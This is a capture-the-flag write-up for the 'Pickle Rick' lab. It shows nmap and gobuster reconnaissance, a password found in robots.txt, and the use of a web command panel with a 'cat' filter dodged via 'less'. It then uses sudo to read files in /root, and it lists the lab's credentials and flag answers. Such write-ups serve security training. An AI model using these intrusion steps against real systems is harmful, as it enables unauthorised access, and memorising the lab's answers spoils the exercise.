# Pickle Rick

## Links 
- Ip `10.10.156.59`
- webpage `http://10.10.156.59`
- `http://10.10.156.59/portal.php`

# Hints 
1. In the Home page
```sh
Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!

I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to 
finish my pickle-reverse potion. The only problem is,
I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!
```
2. There is also an Image

3. In the front end there is a hint
```sh

    Note to self, remember username!

    Username: R1ckRul3s

```



## Port Scan

`nmap -sS -sV -O 10.10.156.59 >> ports.txt`

```sh
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-10 08:28 EDT
Nmap scan report for 10.10.156.59
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=7/10%OT=22%CT=1%CU=30018%PV=Y%DS=5%DC=I%G=Y%TM=668E
OS:7EEB%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508S
OS:T11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=
OS:FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=
OS:M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.69 seconds

```
- Now we will do an aggressive scan to that particular ssh port

```sh
nmap -A -p 22 10.10.156.59 >> ports.txt


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2b:4f:e2:1d:d4:68:ff:1b:b5:5d:e5:e2:64:9a:cf:e3 (RSA)
|   256 eb:f8:6c:c0:a7:8a:86:95:8c:5c:be:58:06:32:be:04 (ECDSA)
|_  256 6a:61:7f:8a:66:52:cd:1a:e0:5a:44:03:df:31:ea:76 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   121.97 ms 10.17.0.1
2   ... 4
5   230.55 ms 10.10.156.59

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.52 seconds

```
- Noting serious got

## Directory Enumeratino

```sh
gobuster dir -u http://10.10.156.59/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o directory.txt

/assets

```

## Checkint for robots.txt
```sh
curl "http://10.10.156.59/robots.txt"

Wubbalubbadubdub

```


## Resources
- Username: R1ckRul3s
- Password: Wubbalubbadubdub (might be)
- Ingredient1: mr. meeseek hair
- Ingredient2: 1 jerry tear
- Ingredient3: fleeb juice


## Approach
1. The 3rd hint that we got its possibilly the ssh login ID
2. Our goal is to find the ingredients
3. We found a ssh port is open but nothing serious there
4. We will do a directory enumeration here
5. We can check there is any robots.txt file or not
6. Lets think `Wubbalubbadubdub` as a password for the ssh login and try to login
7. After checking.....
```sh
sudo ssh R1ckRul3s@10.10.156.59 
R1ckRul3s@10.10.156.59: Permission denied (publickey).
```

8. In /assets there is a jpg file called `portal.jpg` . If there is no password needed for the ssh only the passkey
9. There should be another login page
	1. From a bug hunting perspective I added portal.php as a directory
	2. And we found another login page there
	3. Here in `http://10.10.156.59/portal.php` I tried the password and the username and it takes it! nice!
	4. There is a command panel where linux commands are being taken
	5. If we type `ls`
```sh
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```
	6. If we type `cat Sup3rS3cretPickl3Ingred.txt`
```sh
Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
```
	7. We will use all the alternatives of `cat`
	8. I asked the chatgpt it gave me a list
	9. Lets try them all and for the `less Sup3rS3cretPickl3Ingred.txt` command  we get our first ingredient `mr. meeseek hair`
- We can also try `http://10.10.156.59/Sup3rS3cretPickl3Ingred.txt`
- We will check everything in the command box via `grep -R " "`
- By this we can have code where they validated the commands
- I tried to take the priviledge with `sudo -l` this command
- we can see there is a directory `/usr/local/sbin` so now we can check its elements
- the command for that is `sudo ls ../../../*`
- This is for the second ingredient
```sh

../../../home:
rick
ubuntu
```
- This is for 3rd ingredient
```sh
../../../root:
3rd.txt
snap
```
- Command for the second ingredient
```sh
sudo ls /home/rick

second ingredient

sudo less /home/rick/second\ ingredients

1 jerry tear
```
- Command for the Third ingredient
```sh
sudo less /root/3rd.txt

3rd ingredients: fleeb juice
```
